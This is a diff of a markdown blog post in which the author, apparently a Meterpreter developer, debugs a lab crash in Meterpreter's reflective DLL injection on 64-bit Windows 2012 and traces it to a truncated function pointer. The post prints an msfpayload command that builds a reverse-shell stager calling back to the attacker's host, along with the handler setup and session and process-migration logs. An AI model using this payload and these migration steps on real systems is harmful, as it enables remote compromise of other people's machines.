@@ -70,105 +70,115 @@ After installation, I needed to simulate an attack coming from Metasploit so tha
 
 Creating a payload to do this is really simple thanks to [msfpayload][] (part of Metasploit). On my [Backtrack][] VM I used the following command to generate the PE image:
 
-    root@bt:~# msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.5.26.40 LPORT=443 X > 40-443-x64.exe
+``` txt
+root@bt:~# msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.5.26.40 LPORT=443 X > 40-443-x64.exe
+```
 
 This command creates a 64-bit Windows executable that contains a small stager. This stager connects to `10.5.26.40` (my Backtrack VM) on port `443` (I always choose the HTTPS port to avoid potential outbound firewall issues). Once connected it will download the Meterpreter payload and establish a session with Metasploit.
 
 I copied this binary to the Windows 2012 machine ready to execute. At this point, Metasploit needs to be set up and configured to deal with the incoming request. On the Backtrack VM, we run `msfconsole` and set it up to use `multi/handler` with the appropriate settings, like so:
 
-    msf exploit(handler) > show options
+``` txt
+msf exploit(handler) > show options
 
-    Module options (exploit/multi/handler):
+Module options (exploit/multi/handler):
 
-       Name  Current Setting  Required  Description
-       ----  ---------------  --------  -----------
-
-
-    Payload options (windows/x64/meterpreter/reverse_tcp):
-
-       Name      Current Setting  Required  Description
-       ----      ---------------  --------  -----------
-       EXITFUNC  process          yes       Exit technique: seh, thread, process, none
-       LHOST     10.5.26.40       yes       The listen address
-       LPORT     443              yes       The listen port
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
 
 
-    Exploit target:
+Payload options (windows/x64/meterpreter/reverse_tcp):
 
-       Id  Name
-       --  ----
-       0   Wildcard Target
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique: seh, thread, process, none
+   LHOST     10.5.26.40       yes       The listen address
+   LPORT     443              yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+```
 
 With those settings in place, the exploit was ready to fire:
 
+``` txt
+msf exploit(handler) > exploit
 
-    msf exploit(handler) > exploit
-
-    [*] Started reverse handler on 10.5.26.40:443 
-    [*] Starting the payload handler...
+[*] Started reverse handler on 10.5.26.40:443 
+[*] Starting the payload handler...
+```
 
 From the Windows 2012 VM I ran the exploit binary and my Metepreter session kicked off:
 
-    [*] Sending stage (951296 bytes) to 10.5.26.30
-    [*] Meterpreter session 1 opened (10.5.26.40:443 -> 10.5.26.30:38516) at 2013-09-11 21:55:52 +1000
+``` txt
+[*] Sending stage (951296 bytes) to 10.5.26.30
+[*] Meterpreter session 1 opened (10.5.26.40:443 -> 10.5.26.30:38516) at 2013-09-11 21:55:52 +1000
 
-    meterpreter > getuid
-    Server username: WIN-URCAUVPE291\OJ Reeves
-    meterpreter > sysinfo
-    Computer        : WIN-URCAUVPE291
-    OS              : Windows 2012 (Build 9200).
-    Architecture    : x64
-    System Language : en_US
-    Meterpreter     : x64/win64
-    meterpreter > 
+meterpreter > getuid
+Server username: WIN-URCAUVPE291\OJ Reeves
+meterpreter > sysinfo
+Computer        : WIN-URCAUVPE291
+OS              : Windows 2012 (Build 9200).
+Architecture    : x64
+System Language : en_US
+Meterpreter     : x64/win64
+meterpreter >
+```
 
 Before trying the failure case, I wanted to make sure that the known success case worked locally first. I decided to migrate to `explorer.exe` and see if anything changed:
 
+``` txt
+meterpreter > ps
 
-    meterpreter > ps
+Process List
+============
 
-    Process List
-    ============
+ PID   PPID  Name                Arch    Session     User                       Path
+ ---   ----  ----                ----    -------     ----                       ----
+ 0     0     [System Process]            4294967295                             
+ 4     0     System                      4294967295                             
+ 444   4     smss.exe                    4294967295                             
+ 484   708   svchost.exe                 4294967295                             
+ 536   524   csrss.exe                   4294967295                             
+ 604   596   csrss.exe                   4294967295                             
+ 612   524   wininit.exe                 4294967295                             
+ 640   596   winlogon.exe                4294967295                             
+ 692   720   explorer.exe        x86_64  1           WIN-URCAUVPE291\OJ Reeves  C:\Windows\Explorer.EXE
+ 708   612   services.exe                4294967295                             
+ 716   612   lsass.exe                   4294967295                             
+ 804   708   svchost.exe                 4294967295                             
+ 816   708   svchost.exe                 4294967295                             
 
-     PID   PPID  Name                Arch    Session     User                       Path
-     ---   ----  ----                ----    -------     ----                       ----
-     0     0     [System Process]            4294967295                             
-     4     0     System                      4294967295                             
-     444   4     smss.exe                    4294967295                             
-     484   708   svchost.exe                 4294967295                             
-     536   524   csrss.exe                   4294967295                             
-     604   596   csrss.exe                   4294967295                             
-     612   524   wininit.exe                 4294967295                             
-     640   596   winlogon.exe                4294967295                             
-     692   720   explorer.exe        x86_64  1           WIN-URCAUVPE291\OJ Reeves  C:\Windows\Explorer.EXE
-     708   612   services.exe                4294967295                             
-     716   612   lsass.exe                   4294967295                             
-     804   708   svchost.exe                 4294967295                             
-     816   708   svchost.exe                 4294967295                             
+... snip ...
 
-    ... snip ...
-
-    meterpreter > migrate 692
-    [*] Migrating from 1508 to 692...
-    [*] Migration completed successfully.
-    meterpreter > getuid
-    Server username: WIN-URCAUVPE291\OJ Reeves
-    meterpreter > sysinfo
-    Computer        : WIN-URCAUVPE291
-    OS              : Windows 2012 (Build 9200).
-    Architecture    : x64
-    System Language : en_US
-    Meterpreter     : x64/win64
-    meterpreter > 
+meterpreter > migrate 692
+[*] Migrating from 1508 to 692...
+[*] Migration completed successfully.
+meterpreter > getuid
+Server username: WIN-URCAUVPE291\OJ Reeves
+meterpreter > sysinfo
+Computer        : WIN-URCAUVPE291
+OS              : Windows 2012 (Build 9200).
+Architecture    : x64
+System Language : en_US
+Meterpreter     : x64/win64
+meterpreter > 
+```
 
 Migration seemed to work. Next I tried the failure case. First I launched `notepad.exe` and then attempted to migrate to it:
 
-    meterpreter > execute -f notepad.exe -t -H
-    Process 192 created.
-    meterpreter > migrate 192
-    [*] Migrating from 692 to 192...
-    [-] Error running command migrate: Rex::RuntimeError No response was received to the core_loadlib request.
-    meterpreter >
+``` txt
+meterpreter > execute -f notepad.exe -t -H
+Process 192 created.
+meterpreter > migrate 192
+[*] Migrating from 692 to 192...
+[-] Error running command migrate: Rex::RuntimeError No response was received to the core_loadlib request.
+meterpreter >
+```
 
 The session hung at this point and no Meterpreter commands would work. When I went over to the Windows 2012 VM I saw that there was a notification that the notepad.exe process had crashed. This was great as I was able to reproduce the failure. It was time to investigate the problem.
 
@@ -181,111 +191,121 @@ Before dabbling with any of the binaries and adding debug detail, I repeated the
 
 Upon running the `migrate` command `notepad.exe` crashed and `windbg` caught the exception. This is what it showed:
 
-    (ab0.448): Access violation - code c0000005 (first chance)
-    First chance exceptions are reported before any exception handling.
-    This exception may be expected and handled.
-    00000000`707a7b5c ??              ???
+``` txt
+(ab0.448): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+00000000`707a7b5c ??              ???
 
+```
 We can see that we're accessing memory that we shouldn't be accessing. But why?
 
-    0:003> !analyze -v
-    *******************************************************************************
-    *                                                                             *
-    *                        Exception Analysis                                   *
-    *                                                                             *
-    *******************************************************************************
+``` txt
+0:003> !analyze -v
+*******************************************************************************
+*                                                                             *
+*                        Exception Analysis                                   *
+*                                                                             *
+*******************************************************************************
 
 
-    FAULTING_IP: 
-    unknown!printable+0
-    00000000`707a7b5c ??              ???
+FAULTING_IP: 
+unknown!printable+0
+00000000`707a7b5c ??              ???
 
-    EXCEPTION_RECORD:  ffffffffffffffff -- (.exr 0xffffffffffffffff)
-    ExceptionAddress: 00000000707a7b5c
-       ExceptionCode: c0000005 (Access violation)
-      ExceptionFlags: 00000000
-    NumberParameters: 2
-       Parameter[0]: 0000000000000008
-       Parameter[1]: 00000000707a7b5c
-    Attempt to execute non-executable address 00000000707a7b5c
+EXCEPTION_RECORD:  ffffffffffffffff -- (.exr 0xffffffffffffffff)
+ExceptionAddress: 00000000707a7b5c
+   ExceptionCode: c0000005 (Access violation)
+  ExceptionFlags: 00000000
+NumberParameters: 2
+   Parameter[0]: 0000000000000008
+   Parameter[1]: 00000000707a7b5c
+Attempt to execute non-executable address 00000000707a7b5c
 
-    ... snip ...
+... snip ...
+```
 
 The migration process results in an attempt to execute a section of code in an area of memory that isn't marked as executable. Let's confirm that:
 
-    0:003> !vprot 00000000707a7b5c
-    BaseAddress:       00000000707a7000
-    AllocationBase:    0000000000000000
-    RegionSize:        000000000f839000
-    State:             00010000  MEM_FREE
-    Protect:           00000001  PAGE_NOACCESS
+``` txt
+0:003> !vprot 00000000707a7b5c
+BaseAddress:       00000000707a7000
+AllocationBase:    0000000000000000
+RegionSize:        000000000f839000
+State:             00010000  MEM_FREE
+Protect:           00000001  PAGE_NOACCESS
+```
 
 As we can see the memory area is definitely not marked as executable. But should it be? Should this memory be executable, or are we just pointing to an invalid area of memory? If it was the former, then it might imply that DEP or ASLR are somehow interfering. However, my gut feeling was that it was the latter. A quick look at the contents of the memory at this location would be enough to confirm:
 
-    0:003> du 00000000707a7b5c
-    00000000`707a7b5c  "????????????????????????????????"
-    00000000`707a7b9c  "????????????????????????????????"
-    00000000`707a7bdc  "????????????????????????????????"
-    00000000`707a7c1c  "????????????????????????????????"
-    00000000`707a7c5c  "????????????????????????????????"
-    00000000`707a7c9c  "????????????????????????????????"
-    00000000`707a7cdc  "????????????????????????????????"
-    00000000`707a7d1c  "????????????????????????????????"
-    00000000`707a7d5c  "????????????????????????????????"
-    00000000`707a7d9c  "????????????????????????????????"
-    00000000`707a7ddc  "????????????????????????????????"
-    00000000`707a7e1c  "????????????????????????????????"
+``` txt
+0:003> du 00000000707a7b5c
+00000000`707a7b5c  "????????????????????????????????"
+00000000`707a7b9c  "????????????????????????????????"
+00000000`707a7bdc  "????????????????????????????????"
+00000000`707a7c1c  "????????????????????????????????"
+00000000`707a7c5c  "????????????????????????????????"
+00000000`707a7c9c  "????????????????????????????????"
+00000000`707a7cdc  "????????????????????????????????"
+00000000`707a7d1c  "????????????????????????????????"
+00000000`707a7d5c  "????????????????????????????????"
+00000000`707a7d9c  "????????????????????????????????"
+00000000`707a7ddc  "????????????????????????????????"
+00000000`707a7e1c  "????????????????????????????????"
+```
 
 It's pretty clear that no valid code is located in this area of memory. This implied that there was a possibility that a pointer to an area of code is somehow going awry. But where? To find this out, I needed to add some more debug output to Meterpreter.
 
 Next, I opened the Meterpreter source in Visual Studio 2012 (freshly moved from VS 2010 by yours truly) and prepared to rebuild the binaries with some extra debug output. I littered the code with [OutputDebugString][] calls at various key locations, enabled the existing logging that was built into the source, and rebuilt the suite of binaries from scratch. Once built, I deployed them to my Backtrack VM, fired up `DebugView` on the Windows 2012 VM and repeated the process (including attaching to `notepad.exe` with `windbg`). Here's a snippet of the output:
 
-    [SERVER] Initializing...
-    [SERVER] module loaded at 0x350B0000
-    [SERVER] main server thread: handle=0x00000138 id=0x000008F0 sigterm=0x334D7B20
-    [SERVER] Using SSL transport...
-    [SERVER] Initializing tokens...
-    [SERVER] Flushing the socket handle...
-    [SERVER] Initializing SSL...
-    [SERVER] Negotiating SSL...
-    ModLoad: 000007ff`58060000 000007ff`58075000   C:\Windows\system32\NETAPI32.DLL
-    ModLoad: 000007ff`586d0000 000007ff`586de000   C:\Windows\system32\netutils.dll
-    ModLoad: 000007ff`5b020000 000007ff`5b044000   C:\Windows\system32\srvcli.dll
-    ModLoad: 000007ff`58020000 000007ff`58035000   C:\Windows\system32\wkscli.dll
-    ModLoad: 000007ff`5ad10000 000007ff`5ad2a000   C:\Windows\system32\CRYPTSP.dll
-    ModLoad: 000007ff`5a990000 000007ff`5a9d9000   C:\Windows\system32\rsaenh.dll
-    [SERVER] Sending a HTTP GET request to the remote side...
-    [SERVER] Completed writing the HTTP GET request: 27
-    [SERVER] Registering dispatch routines...
-    Registering a new command (core_loadlib)...
-    Allocated memory...
-    Setting new command...
-    Fixing next/prev...
-    Done...
-    [SERVER] Entering the main server dispatch loop for transport 0...
-    [DISPATCH] entering server_dispatch( 0x334D7B60 )
-    [SCHEDULER] entering scheduler_initialize.
-    [SCHEDULER] leaving scheduler_initialize.
-    [DISPATCH] created command_process_thread 0x33523030, handle=0x000001F0
-    [COMMAND] Processing method core_loadlib
-    [COMMAND] core_loadlib: Entry
-    [COMMAND] core_loadlib: libraryPath (ext264209.x64.dll) flags (2)
-    [COMMAND] core_loadlib: lib does not exist locally (being uploaded)
-    [COMMAND] core_loadlib: lib is not to be stored on disk
-    [LOADLIBRARYR] starting
-    [LOADLIBRARYR] GetReflectiveLoaderOffset
-    [LOADLIBRARYR] GetReflectiveLoaderOffset (5488)
-    [LOADLIBRARYR] Calling VirtualProtect lpBuffer (0000008935318B20) length (428544)
-    [LOADLIBRARYR] Calling pReflectiveLoader (000000893531A090)
-    ModLoad: 000007ff`555e0000 000007ff`55600000   C:\Windows\system32\WINMM.dll
-    ModLoad: 000007ff`555a0000 000007ff`555d2000   C:\Windows\system32\WINMMBASE.dll
-    ModLoad: 000007ff`57e00000 000007ff`57e2c000   C:\Windows\system32\IPHLPAPI.DLL
-    ModLoad: 000007ff`57de0000 000007ff`57dea000   C:\Windows\system32\WINNSI.DLL
-    [LOADLIBRARYR] Calling pDllMain (0000000033449BEC)
-    (9b8.968): Access violation - code c0000005 (first chance)
-    First chance exceptions are reported before any exception handling.
-    This exception may be expected and handled.
-    00000000`33449bec ??              ???
+``` txt
+[SERVER] Initializing...
+[SERVER] module loaded at 0x350B0000
+[SERVER] main server thread: handle=0x00000138 id=0x000008F0 sigterm=0x334D7B20
+[SERVER] Using SSL transport...
+[SERVER] Initializing tokens...
+[SERVER] Flushing the socket handle...
+[SERVER] Initializing SSL...
+[SERVER] Negotiating SSL...
+ModLoad: 000007ff`58060000 000007ff`58075000   C:\Windows\system32\NETAPI32.DLL
+ModLoad: 000007ff`586d0000 000007ff`586de000   C:\Windows\system32\netutils.dll
+ModLoad: 000007ff`5b020000 000007ff`5b044000   C:\Windows\system32\srvcli.dll
+ModLoad: 000007ff`58020000 000007ff`58035000   C:\Windows\system32\wkscli.dll
+ModLoad: 000007ff`5ad10000 000007ff`5ad2a000   C:\Windows\system32\CRYPTSP.dll
+ModLoad: 000007ff`5a990000 000007ff`5a9d9000   C:\Windows\system32\rsaenh.dll
+[SERVER] Sending a HTTP GET request to the remote side...
+[SERVER] Completed writing the HTTP GET request: 27
+[SERVER] Registering dispatch routines...
+Registering a new command (core_loadlib)...
+Allocated memory...
+Setting new command...
+Fixing next/prev...
+Done...
+[SERVER] Entering the main server dispatch loop for transport 0...
+[DISPATCH] entering server_dispatch( 0x334D7B60 )
+[SCHEDULER] entering scheduler_initialize.
+[SCHEDULER] leaving scheduler_initialize.
+[DISPATCH] created command_process_thread 0x33523030, handle=0x000001F0
+[COMMAND] Processing method core_loadlib
+[COMMAND] core_loadlib: Entry
+[COMMAND] core_loadlib: libraryPath (ext264209.x64.dll) flags (2)
+[COMMAND] core_loadlib: lib does not exist locally (being uploaded)
+[COMMAND] core_loadlib: lib is not to be stored on disk
+[LOADLIBRARYR] starting
+[LOADLIBRARYR] GetReflectiveLoaderOffset
+[LOADLIBRARYR] GetReflectiveLoaderOffset (5488)
+[LOADLIBRARYR] Calling VirtualProtect lpBuffer (0000008935318B20) length (428544)
+[LOADLIBRARYR] Calling pReflectiveLoader (000000893531A090)
+ModLoad: 000007ff`555e0000 000007ff`55600000   C:\Windows\system32\WINMM.dll
+ModLoad: 000007ff`555a0000 000007ff`555d2000   C:\Windows\system32\WINMMBASE.dll
+ModLoad: 000007ff`57e00000 000007ff`57e2c000   C:\Windows\system32\IPHLPAPI.DLL
+ModLoad: 000007ff`57de0000 000007ff`57dea000   C:\Windows\system32\WINNSI.DLL
+[LOADLIBRARYR] Calling pDllMain (0000000033449BEC)
+(9b8.968): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+00000000`33449bec ??              ???
+```
 
 The extra debug calls that I added to the source are those marked with `[LOADLIBRARYR]`. These calls were located in the guts of the reflective DLL injection code.
 
@@ -297,14 +317,16 @@ What was interesting about the log is that the first call to `DllMain()` that is
 
 The nature of the reflective loading mechanism implied to me that the addresses of `pReflectiveLoader` and `pDllMain` should actually be quite close together in memory. However, focussing on a small part of the output, I noticed the following:
 
-    [LOADLIBRARYR] Calling pReflectiveLoader (000000893531A090)
-    [LOADLIBRARYR] Calling pDllMain          (0000000033449BEC)
+``` txt
+[LOADLIBRARYR] Calling pReflectiveLoader (000000893531A090)
+[LOADLIBRARYR] Calling pDllMain          (0000000033449BEC)
+```
 
 Those two pointers were nowhere near each other! The more perceptive of you will have noticed that the `pDllMain` pointer appeared to have lost its higher-order [DWORD][]. The pointer had in fact been truncated!
 
 But why? It wasn't immediately obvious to me what the reason was, but I was keen to validate that this was the case. To prove my theory, I hacked the code a little so that the higher-order DWORD of the `pReflectiveLoader` value was used as the higher-order DWORD of `pDllMain` as well. The hack looked something like this:
 
-```
+``` txt
 ULONG_PTR ulReflectiveLoaderBase = ((ULONG_PTR)pReflectiveLoader) & (((ULONG_PTR)-1) ^ (0xFFFFFFFF));
 pDllMain = (DLLMAIN)(pReflectiveLoader() | ulReflectiveLoaderBase);
 ```
@@ -328,13 +350,13 @@ So what was it?
 
 The `pReflectiveLoader` pointer is a function pointer of a type defined like so:
 
-```
+``` c
 typedef DWORD (WINAPI * REFLECTIVELOADER)( VOID );
 ```
 
 However, the `ReflectiveLoader()` function was defined in the source like so:
 
-```
+``` c
 #ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
 DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )
 #else
@@ -347,7 +369,7 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
 
 So the function returns a [ULONG_PTR][] (which is 64-bits) but the function pointer type returned a [DWORD][] (which is 32-bits). This is what was causing the truncation of the pointer and effectively zeroing out the higher-order DWORD of `pDllMain`. The fix was to simply change the return type of the function pointer to match:
 
-```
+``` c
 typedef ULONG_PTR (WINAPI * REFLECTIVELOADER)( VOID );
 ```
 
@@ -379,13 +401,13 @@ I answered quickly but realised after that I was a bit hasty, so I'm going to cl
 
 We need to review a few snippets of code to understand why the compiler didn't complain. Firstly, the function-pointer type definition (prior to the fix):
 
-```
+``` c
 typedef DWORD (WINAPI * REFLECTIVELOADER)( VOID );
 ```
 
 Second, the declaration of the `ReflectiveLoader()` function:
 
-```
+``` c
 #ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
 DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )
 #else
@@ -398,14 +420,14 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
 
 Third, the declaration of both `pDllMain` and `pReflectiveLoader`:
 
-```
+``` c
 REFLECTIVELOADER pReflectiveLoader = NULL;
 DLLMAIN pDllMain                   = NULL;
 ```
 
 Finally, the actual calls that use these pointers:
 
-```
+``` c
 pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpBuffer + dwReflectiveLoaderOffset);
 // ... snip ...
 pDllMain = (DLLMAIN)pReflectiveLoader();
